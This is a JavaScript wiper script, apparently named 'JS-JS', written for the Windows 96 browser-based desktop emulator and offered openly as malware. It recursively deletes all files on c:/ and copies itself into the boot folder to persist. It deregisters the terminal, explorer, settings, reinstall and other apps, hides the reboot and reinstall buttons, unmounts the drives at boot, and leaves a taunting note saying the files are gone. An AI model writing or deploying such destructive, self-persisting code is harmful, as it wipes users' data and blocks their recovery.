!async function _main_() {
    async function rd(path) {
      let list = await w96.FS.readdir(path);
        for(let _l of list) {
            let l = { filetype: await w96.FS.filetype(_l), path: _l }
            if(l.filetype === 1) {
                await rd(l.path);
                await w96.FS.rmdir(l.path);
            } else w96.FS.rm(l.path);
        }
    }
//delete files and recreate boot dir
    
    await rd('c:/');
    await w96.FS.mkdir('c:/system/boot');
	

    // code to copy to boot
    await w96.FS.writestr('c:/system/boot/js.js', `!${_main_.toString()}();`);



    //code for disabling apps
	setTimeout(function(){
w96.sys.reg.deregisterApp("terminal");
w96.sys.reg.deregisterApp("explorer");
w96.sys.reg.deregisterApp("monaco");
w96.sys.reg.deregisterApp("ctrl");
w96.sys.reg.deregisterApp("backupmgr");
w96.sys.reg.deregisterApp("blocks");
w96.sys.reg.deregisterApp("gameing");
w96.sys.reg.deregisterApp("bsod");
w96.sys.reg.deregisterApp("devmgr");
w96.sys.reg.deregisterApp("flags");
w96.sys.reg.deregisterApp("run");
w96.sys.reg.deregisterApp("winspector");
w96.sys.reg.deregisterApp("settings");
w96.sys.reg.deregisterApp("shareboard");
w96.sys.reg.deregisterApp("iexploder");
w96.sys.reg.deregisterApp("dyk");
w96.sys.reg.deregisterApp("dtool");
w96.sys.reg.deregisterApp("effects");
w96.sys.reg.deregisterApp("keymgr");
w96.sys.reg.deregisterApp("matrix");
w96.sys.reg.deregisterApp("uploader");
w96.sys.reg.deregisterApp("vidplayer");
w96.sys.reg.deregisterApp("vm");
w96.sys.reg.deregisterApp("wiki96");
w96.sys.reg.deregisterApp("wasmrt");
w96.sys.reg.deregisterApp("wasm-tools");
w96.sys.reg.deregisterApp("eyeframe");
w96.sys.reg.deregisterApp("textpad");
w96.sys.reg.deregisterApp("super-player");
w96.sys.reg.deregisterApp("dosbox");
w96.sys.reg.deregisterApp("nes");
w96.sys.reg.deregisterApp("youare");
w96.sys.reg.deregisterApp("reinstall");



  },500);
	
//code for removing reboot and restart buttons
	                setInterval(loop, 2);
					
					
	
	
	function loop() {
	document.getElementById("item_reinstall").style.display = "none";
document.getElementById("item_reboot").style.display = "none";	

	}
	
	await w96.FS.writestr('c:/system/boot/woozy.js', `setTimeout(function(){ w96.sys.execFile("w:/system/apps/wiki96/pages/misc/glossary/woozy.png") }, 1000); 	setTimeout(function(){ w96.sys.execFile("c:/system/boot/welcome.md") }, 2000);`);
	await w96.FS.writestr('c:/system/boot/umount.js', ` await w96.FS.unmount('C:/');await w96.FS.unmount('X:/');await w96.FS.unmount('W:/');`);
	await w96.FS.writestr('c:/system/boot/welcome.md', `***Welcome!***
	Your system has been fucked by JS-JS and all of your files are gone. Enjoy this image of Woozy, have a nice day!.`);

}()
